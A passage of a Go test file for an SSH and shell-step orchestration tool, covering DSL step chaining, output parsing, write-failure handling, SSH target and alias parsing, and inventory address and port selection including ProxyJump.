		t.Errorf("truncated output should exceed maxLen once the suffix is appended, got len %d", len(truncated))
	}
	if !strings.Contains(truncated, "truncated") {
		t.Error("truncated output should contain '... (truncated)'")
	}
}

func TestParseOutputs_EdgeCases(t *testing.T) {
	// empty lines, spaces around =
	raw := "\n  key1 = value1 \nkey2=value with spaces\n\n  =no_key\n"
	outputs := ParseOutputs(raw)

	if outputs["key1"] != "value1" {
		t.Errorf("key1: want 'value1', got %q", outputs["key1"])
	}
	if outputs["key2"] != "value with spaces" {
		t.Errorf("key2: want 'value with spaces', got %q", outputs["key2"])
	}
}

func TestParseOutputs_MultilineValues(t *testing.T) {
	raw := "single=line\nmulti=first part\n"
	outputs := ParseOutputs(raw)
	if outputs["single"] != "line" {
		t.Errorf("single: want 'line', got %q", outputs["single"])
	}
}

func TestFormatResults(t *testing.T) {
	store, _ := NewOutputStore(nil)
	results := []StepResult{
		{
			Name:     "step-1",
			Host:     "host-a",
			ExitCode: 0,
			Stdout:   "hello world\n",
			FilePath: "/tmp/test/step-1.out",
			Outputs:  map[string]string{"key": "val"},
		},
		{
			Name:     "step-2",
			ExitCode: 1,
			Error:    "command failed",
			Stderr:   "permission denied",
		},
	}

	formatted := formatResults(results, store)

	if !strings.Contains(formatted, "=== step-1 [host-a] exit:0 ===") {
		t.Error("should contain step-1 header")
	}
	if !strings.Contains(formatted, "key=val") {
		t.Error("should contain output key=val")
	}
	if !strings.Contains(formatted, "=== step-2 [local] exit:1 ===") {
		t.Error("should contain step-2 header with [local]")
	}
	if !strings.Contains(formatted, "error: command failed") {
		t.Error("should contain error message")
	}
	if !strings.Contains(formatted, "permission denied") {
		t.Error("should contain stderr")
	}
}

func TestExecute_MultiStepLocalChain(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	input := `### gen-data

echo "result=42" >> $OUTPUT

### use-data

echo "the answer is {{gen-data.outputs.result}}"
`
	steps, err := ParseDSL(input)
	if err != nil {
		t.Fatal(err)
	}

	results, err := exec.Execute(context.Background(), steps)
	if err != nil {
		t.Fatal(err)
	}

	if len(results) != 2 {
		t.Fatalf("want 2 results, got %d", len(results))
	}

	for _, r := range results {
		if r.ExitCode != 0 {
			t.Errorf("step %s: exit %d, stderr: %s", r.Name, r.ExitCode, r.Stderr)
		}
	}

	// use-data should contain the resolved value
	if !strings.Contains(results[1].Stdout, "42") {
		t.Errorf("step use-data should contain '42', got %q", results[1].Stdout)
	}
}

func TestExecute_HelpAction(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	steps := []Step{{Name: "help", Action: ActionHelp}}
	results, err := exec.Execute(context.Background(), steps)
	if err != nil {
		t.Fatal(err)
	}
	if len(results) != 1 {
		t.Fatalf("want 1 result, got %d", len(results))
	}
	if results[0].Stdout == "" {
		t.Error("help should return non-empty text")
	}
	if results[0].ExitCode != 0 {
		t.Error("help should exit 0")
	}
}

func TestSSH_NoHost(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := &Step{Name: "no-host-ssh", Action: ActionSSH, Body: "echo hi"}
	_, err := exec.executeSSH(context.Background(), 0, step)
	if err == nil {
		t.Error("SSH without hosts should error")
	}
}

func TestWriteFailure_FilePathEmpty(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	// Nuke the output dir so os.WriteFile fails
	dir := filepath.Dir(store.StepFilePath("probe"))
	os.RemoveAll(dir)

	// executeLocal: write fails but step still completes
	step := Step{Name: "probe", Action: ActionLocal, Body: "echo hello"}
	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}
	r := results[0]
	if r.FilePath != "" {
		t.Errorf("FilePath should be empty on write failure, got %q", r.FilePath)
	}
	if !strings.Contains(r.Error, "output write failed") {
		t.Errorf("Error should mention write failure, got %q", r.Error)
	}
	if !strings.Contains(r.Stdout, "hello") {
		t.Errorf("Stdout should still be captured, got %q", r.Stdout)
	}
	if r.ExitCode != 0 {
		t.Errorf("ExitCode should be 0 (step succeeded), got %d", r.ExitCode)
	}
}

func TestWriteFailure_MergeFanout(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	dir := filepath.Dir(store.StepFilePath("merge"))
	os.RemoveAll(dir)

	perHost := []StepResult{
		{Name: "merge", Host: "h1", Stdout: "out1"},
	}
	merged := exec.mergeFanoutOutputs("merge", perHost)

	if merged.FilePath != "" {
		t.Errorf("merged FilePath should be empty on write failure, got %q", merged.FilePath)
	}
	if !strings.Contains(merged.Error, "output write failed") {
		t.Errorf("merged Error should mention write failure, got %q", merged.Error)
	}
	if !strings.Contains(merged.Stdout, "out1") {
		t.Errorf("merged Stdout should still be set, got %q", merged.Stdout)
	}
}

func TestWriteSuccess_FilePathSet(t *testing.T) {
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := Step{Name: "ok-write", Action: ActionLocal, Body: "echo works"}
	results, err := exec.executeLocal(context.Background(), 0, &step)
	if err != nil {
		t.Fatal(err)
	}
	r := results[0]
	if r.FilePath == "" {
		t.Error("FilePath should be set on successful write")
	}
	if r.Error != "" {
		t.Errorf("Error should be empty on success, got %q", r.Error)
	}
}

func TestSSH_RejectsMalformedHostName(t *testing.T) {
	// Plain hostnames now fall back to ssh_config resolution, so the only
	// inputs shellkit rejects pre-flight are ones that don't look like valid
	// host names at all (whitespace, shell metacharacters, etc).
	store, _ := NewOutputStore(nil)
	exec := NewExecutor(store, nil)

	step := &Step{Name: "bad-host", Action: ActionSSH, Hosts: []string{"not a host"}, Body: "echo hi"}
	_, err := exec.executeSSH(context.Background(), 0, step)
	if err == nil {
		t.Error("SSH with malformed host should error")
	}
}

func TestParseRawSSHTarget(t *testing.T) {
	tests := []struct {
		in   string
		ok   bool
		user string
		host string
		port int
	}{
		{"user@host.example.com", true, "user", "host.example.com", 0},
		{"deploy@10.0.0.1", true, "deploy", "10.0.0.1", 0},
		{
			"examplesandboxtoken@ssh.app.daytona.io",
			true,
			"examplesandboxtoken",
			"ssh.app.daytona.io",
			0,
		},
		{"user@host:2222", true, "user", "host", 2222},
		{"user@host:notaport", false, "", "", 0},
		{"justhost", false, "", "", 0},
		{"@host", false, "", "", 0},
		{"user@", false, "", "", 0},
		{"", false, "", "", 0},
		{"a@b", true, "a", "b", 0},
	}

	for _, tt := range tests {
		srv, ok := parseRawSSHTarget(tt.in)
		if ok != tt.ok {
			t.Errorf("parseRawSSHTarget(%q): ok=%v, want %v", tt.in, ok, tt.ok)
			continue
		}
		if !ok {
			continue
		}
		if srv.User != tt.user {
			t.Errorf("parseRawSSHTarget(%q): user=%q, want %q", tt.in, srv.User, tt.user)
		}
		if srv.IP != tt.host {
			t.Errorf("parseRawSSHTarget(%q): host=%q, want %q", tt.in, srv.IP, tt.host)
		}
		if srv.Port != tt.port {
			t.Errorf("parseRawSSHTarget(%q): port=%d, want %d", tt.in, srv.Port, tt.port)
		}
	}
}

func TestResolveSSHHost_FallsBackToRawTarget(t *testing.T) {
	servers := []inventory.Server{{Name: "known", IP: "1.2.3.4"}}
	store, _ := NewOutputStore(servers)
	exec := NewExecutor(store, servers)

	if srv := exec.resolveSSHHost("known"); srv == nil || srv.IP != "1.2.3.4" {
		t.Errorf("inventory hit should resolve, got %v", srv)
	}

	srv := exec.resolveSSHHost("token@ssh.app.daytona.io")
	if srv == nil {
		t.Fatal("raw user@host should resolve via fallback")
	}
	if srv.User != "token" || srv.IP != "ssh.app.daytona.io" {
		t.Errorf("raw fallback: user=%q host=%q, want token / ssh.app.daytona.io", srv.User, srv.IP)
	}

	// A plain hostname (not in inventory, no '@') now resolves as an SSH alias
	// — ssh_config will own user/port/identity. Failure surfaces from ssh itself.
	srv = exec.resolveSSHHost("nope")
	if srv == nil {
		t.Fatal("plain hostname should resolve as ssh_config alias")
	}
	if srv.SSHAlias != "nope" {
		t.Errorf("plain hostname: SSHAlias=%q, want nope", srv.SSHAlias)
	}

	// Strings that don't look like hostnames are still rejected.
	if srv := exec.resolveSSHHost("not a host"); srv != nil {
		t.Errorf("malformed name should not resolve, got %v", srv)
	}
}

func TestParseSSHAlias(t *testing.T) {
	tests := []struct {
		in string
		ok bool
	}{
		{"myhost", true},
		{"web-1", true},
		{"host.example.com", true},
		{"", false},
		{"has space", false},
		{"shell$meta", false},
	}
	for _, tt := range tests {
		srv, ok := parseSSHAlias(tt.in)
		if ok != tt.ok {
			t.Errorf("parseSSHAlias(%q): ok=%v, want %v", tt.in, ok, tt.ok)
			continue
		}
		if !ok {
			continue
		}
		if srv.SSHAlias != tt.in {
			t.Errorf("parseSSHAlias(%q): SSHAlias=%q", tt.in, srv.SSHAlias)
		}
	}
}

func TestSshArgs_AliasOnlySyntheticServer(t *testing.T) {
	srv, ok := parseSSHAlias("web-1")
	if !ok {
		t.Fatal("parse should succeed")
	}
	args := sshconn.SSHArgs(srv, inventory.AddrAuto)
	if len(args) != 1 || args[0] != "web-1" {
		t.Errorf("alias-only synthetic server should produce [alias], got %v", args)
	}
}

func TestSshArgs_RawTargetSyntheticServer(t *testing.T) {
	// Synthetic server from parseRawSSHTarget — no SSHAlias, has User+IP+Port.
	srv, ok := parseRawSSHTarget("user@host.example.com:2222")
	if !ok {
		t.Fatal("parse should succeed")
	}
	args := sshconn.SSHArgs(srv, inventory.AddrAuto)

	joined := strings.Join(args, " ")
	if !strings.Contains(joined, "-l user") {
		t.Errorf("args should include -l user, got: %s", joined)
	}
	if !strings.Contains(joined, "-p 2222") {
		t.Errorf("args should include -p 2222, got: %s", joined)
	}
	if !strings.Contains(joined, "host.example.com") {
		t.Errorf("args should include host.example.com, got: %s", joined)
	}
}

// --- AddrPref tests ---

func TestParseAddrPref_Valid(t *testing.T) {
	for _, s := range []string{"auto", "wan", "lan", "wireguard", "tailscale", "easytier"} {
		pref, err := inventory.ParseAddrPref(s)
		if err != nil {
			t.Errorf("ParseAddrPref(%q) unexpected error: %v", s, err)
		}
		if string(pref) != s {
			t.Errorf("ParseAddrPref(%q) = %q, want %q", s, pref, s)
		}
	}
}

func TestParseAddrPref_Invalid(t *testing.T) {
	_, err := inventory.ParseAddrPref("bogus")
	if err == nil {
		t.Error("ParseAddrPref(bogus) should error")
	}
}

func TestHostFor_Explicit(t *testing.T) {
	s := inventory.Server{
		Name:        "test",
		IP:          "1.2.3.4",
		PrivateIP:   "10.0.0.1",
		WGIP:        "10.100.0.5",
		TailscaleIP: "100.64.0.1",
		EasytierIP:  "10.144.144.1",
	}

	tests := []struct {
		pref inventory.AddrPref
		want string
	}{
		{inventory.AddrWan, "1.2.3.4"},
		{inventory.AddrLan, "10.0.0.1"},
		{inventory.AddrWG, "10.100.0.5"},
		{inventory.AddrTailscale, "100.64.0.1"},
		{inventory.AddrEasytier, "10.144.144.1"},
	}

	for _, tt := range tests {
		got, err := s.HostFor(tt.pref)
		if err != nil {
			t.Errorf("HostFor(%s): %v", tt.pref, err)
			continue
		}
		if got != tt.want {
			t.Errorf("HostFor(%s) = %q, want %q", tt.pref, got, tt.want)
		}
	}
}

func TestHostFor_ExplicitMissing(t *testing.T) {
	s := inventory.Server{Name: "minimal", IP: "1.2.3.4"}

	for _, pref := range []inventory.AddrPref{inventory.AddrWG, inventory.AddrLan, inventory.AddrTailscale, inventory.AddrEasytier} {
		_, err := s.HostFor(pref)
		if err == nil {
			t.Errorf("HostFor(%s) should error on missing field", pref)
		}
	}
}

func TestHostFor_AutoFallback(t *testing.T) {
	tests := []struct {
		name string
		srv  inventory.Server
		want string
	}{
		{
			"prefers easytier",
			inventory.Server{Name: "z", EasytierIP: "10.144.144.1", WGIP: "10.100.0.1", TailscaleIP: "100.1.1.1", PrivateIP: "10.0.0.1", IP: "1.1.1.1"},
			"10.144.144.1",
		},
		{
			"prefers wg",
			inventory.Server{Name: "a", WGIP: "10.100.0.1", TailscaleIP: "100.1.1.1", PrivateIP: "10.0.0.1", IP: "1.1.1.1"},
			"10.100.0.1",
		},
		{
			"falls to tailscale",
			inventory.Server{Name: "b", TailscaleIP: "100.1.1.1", PrivateIP: "10.0.0.1", IP: "1.1.1.1"},
			"100.1.1.1",
		},
		{
			"falls to private",
			inventory.Server{Name: "c", PrivateIP: "10.0.0.1", IP: "1.1.1.1"},
			"10.0.0.1",
		},
		{
			"falls to public",
			inventory.Server{Name: "d", IP: "1.1.1.1"},
			"1.1.1.1",
		},
	}

	for _, tt := range tests {
		got, err := tt.srv.HostFor(inventory.AddrAuto)
		if err != nil {
			t.Errorf("%s: %v", tt.name, err)
			continue
		}
		if got != tt.want {
			t.Errorf("%s: got %q, want %q", tt.name, got, tt.want)
		}
	}
}

func TestHostFor_AutoEmpty(t *testing.T) {
	s := inventory.Server{Name: "empty"}
	_, err := s.HostFor(inventory.AddrAuto)
	if err == nil {
		t.Error("HostFor(auto) should error when no addresses available")
	}
}

func TestConnectAddrFor_PortLogic(t *testing.T) {
	s := inventory.Server{
		Name:      "nat-host",
		IP:        "203.0.113.18",
		Port:      2222,
		PrivateIP: "10.0.0.21",
		WGIP:      "10.99.0.124",
	}

	// WAN IP uses configured NAT port
	addr, err := s.ConnectAddrFor(inventory.AddrWan)
	if err != nil {
		t.Fatal(err)
	}
	if addr != "203.0.113.18:2222" {
		t.Errorf("wan addr: got %q, want 203.0.113.18:2222", addr)
	}

	// Internal IPs use port 22
	addr, err = s.ConnectAddrFor(inventory.AddrLan)
	if err != nil {
		t.Fatal(err)
	}
	if addr != "10.0.0.21:22" {
		t.Errorf("private addr: got %q, want 10.0.0.21:22", addr)
	}

	addr, err = s.ConnectAddrFor(inventory.AddrWG)
	if err != nil {
		t.Fatal(err)
	}
	if addr != "10.99.0.124:22" {
		t.Errorf("wg addr: got %q, want 10.99.0.124:22", addr)
	}
}

func TestConnectAddrFor_DefaultPort(t *testing.T) {
	s := inventory.Server{Name: "no-port", IP: "1.2.3.4"}
	addr, err := s.ConnectAddrFor(inventory.AddrWan)
	if err != nil {
		t.Fatal(err)
	}
	if addr != "1.2.3.4:22" {
		t.Errorf("got %q, want 1.2.3.4:22", addr)
	}
}

func TestResolvedIP(t *testing.T) {
	tests := []struct {
		name string
		srv  inventory.Server
		want string
	}{
		{
			"prefer_net=lan uses lan_ip",
			inventory.Server{Name: "a", IP: "1.1.1.1", PrivateIP: "10.0.0.1", PreferNet: "lan"},
			"10.0.0.1",
		},
		{
			"prefer_net=easytier uses easytier_ip",
			inventory.Server{Name: "b", IP: "1.1.1.1", EasytierIP: "10.144.144.1", PreferNet: "easytier"},
			"10.144.144.1",
		},
		{
			"no prefer_net defaults to wan_ip",
			inventory.Server{Name: "c", IP: "1.1.1.1", PrivateIP: "10.0.0.1", EasytierIP: "10.144.144.1"},
			"1.1.1.1",
		},
		{
			"lan-only host with prefer_net",
			inventory.Server{Name: "d", PrivateIP: "192.168.89.200", PreferNet: "lan"},
			"192.168.89.200",
		},
		{
			"no prefer_net no public falls to any available",
			inventory.Server{Name: "e", PrivateIP: "10.0.0.1"},
			"10.0.0.1",
		},
		{
			"empty server returns empty",
			inventory.Server{Name: "f"},
			"",
		},
	}

	for _, tt := range tests {
		got := tt.srv.ResolvedIP()
		if got != tt.want {
			t.Errorf("%s: got %q, want %q", tt.name, got, tt.want)
		}
	}
}

func TestPortFor(t *testing.T) {
	s := inventory.Server{
		Name: "nat-host",
		IP:   "185.150.190.38",
		Port: 4218,
	}

	// Public IP gets the NAT port
	if p := s.PortFor("185.150.190.38"); p != 4218 {
		t.Errorf("public IP port: got %d, want 4218", p)
	}

	// Non-public IP gets port 22
	if p := s.PortFor("10.144.144.30"); p != 22 {
		t.Errorf("easytier IP port: got %d, want 22", p)
	}

	// No custom port defaults to 22
	s2 := inventory.Server{Name: "plain", IP: "1.2.3.4"}
	if p := s2.PortFor("1.2.3.4"); p != 22 {
		t.Errorf("no-port public: got %d, want 22", p)
	}
}

func TestConnectAddrFor_Easytier(t *testing.T) {
	s := inventory.Server{
		Name:       "et-host",
		IP:         "185.150.190.38",
		Port:       4218,
		EasytierIP: "10.144.144.30",
	}
	addr, err := s.ConnectAddrFor(inventory.AddrEasytier)
	if err != nil {
		t.Fatal(err)
	}
	if addr != "10.144.144.30:22" {
		t.Errorf("got %q, want 10.144.144.30:22", addr)
	}
}

func TestSshArgs_AddrPref(t *testing.T) {
	s := inventory.Server{
		Name:     "test-host",
		SSHAlias: "test-alias",
		IP:       "203.0.113.18",
		Port:     2222,
		User:     "deploy",
		WGIP:     "10.100.0.5",
	}

	// Auto should use alias
	args := sshconn.SSHArgs(&s, inventory.AddrAuto)
	if len(args) != 1 || args[0] != "test-alias" {
		t.Errorf("auto: want [test-alias], got %v", args)
	}

	// WG should bypass alias and use wg IP with port 22
	args = sshconn.SSHArgs(&s, inventory.AddrWG)
	found := false
	for _, a := range args {
		if a == "10.100.0.5" {
			found = true
		}
		if a == "test-alias" {
			t.Error("wg: should not use alias")
		}
	}
	if !found {
		t.Errorf("wg: should contain 10.100.0.5, got %v", args)
	}
	// check port is 22 (not NAT port)
	for i, a := range args {
		if a == "-p" && i+1 < len(args) && args[i+1] != "22" {
			t.Errorf("wg: port should be 22, got %s", args[i+1])
		}
	}
}

func TestSshArgs_ProxyJump(t *testing.T) {
	s := inventory.Server{
		Name:           "robot-router",
		SSHAlias:       "robot-router",
		PrivateIP:      "192.168.90.1",
		User:           "admin",
		ProxyJump:      "bastion-1",
		IdentitiesOnly: true,
	}

	// Auto defers to the alias — ssh config supplies ProxyJump and
	// IdentitiesOnly, so no extra flags here.
	auto := sshconn.SSHArgs(&s, inventory.AddrAuto)
	if len(auto) != 1 || auto[0] != "robot-router" {
		t.Errorf("auto: want [robot-router], got %v", auto)
	}

	// An explicit address pref bypasses the config and must carry both through.
	lan := strings.Join(sshconn.SSHArgs(&s, inventory.AddrLan), " ")
	if !strings.Contains(lan, "-J bastion-1") {
		t.Errorf("lan: should include -J bastion-1, got: %s", lan)
	}
	if !strings.Contains(lan, "-o IdentitiesOnly=yes") {
		t.Errorf("lan: should include -o IdentitiesOnly=yes, got: %s", lan)
	}
	if !strings.Contains(lan, "192.168.90.1") {
		t.Errorf("lan: should include lan_ip 192.168.90.1, got: %s", lan)
	}
}

func TestDSLJump_OverridesServerProxyJump(t *testing.T) {
	// A raw SSH target has no ProxyJump by default.
	srv, ok := parseRawSSHTarget("root@10.0.0.5:22")
	if !ok {
		t.Fatal("parseRawSSHTarget failed")
	}
	if srv.ProxyJump != "" {
		t.Fatalf("raw target should have no ProxyJump, got %q", srv.ProxyJump)
	}

	// The DSL "jump" field overrides it.
	srv.ProxyJump = "bastion-host"
	args := strings.Join(sshconn.SSHArgs(srv, inventory.AddrWan), " ")
	if !strings.Contains(args, "-J bastion-host") {
		t.Errorf("sshArgs should include -J bastion-host, got: %s", args)
	}
	if !strings.Contains(args, "10.0.0.5") {
		t.Errorf("sshArgs should target 10.0.0.5, got: %s", args)
	}
}

func TestDSLJump_AliasServerGetsProxyJump(t *testing.T) {
	// An SSH alias server defers to ssh config (no flags).
	srv, ok := parseSSHAlias("target-host")
	if !ok {
		t.Fatal("parseSSHAlias failed")
	}
	auto := sshconn.SSHArgs(srv, inventory.AddrAuto)
	if len(auto) != 1 || auto[0] != "target-host" {
		t.Errorf("alias auto: want [target-host], got %v", auto)
	}

	// With jump set, alias server needs explicit addr pref to emit -J.
	// Under AddrAuto the alias is used as-is (ssh_config handles ProxyJump).
	srv.ProxyJump = "jumpbox"
	srv.IP = "10.0.0.99" // needed for non-auto addr pref
	wan := strings.Join(sshconn.SSHArgs(srv, inventory.AddrWan), " ")
	if !strings.Contains(wan, "-J jumpbox") {
		t.Errorf("alias+jump wan: should include -J jumpbox, got: %s", wan)
	}
}
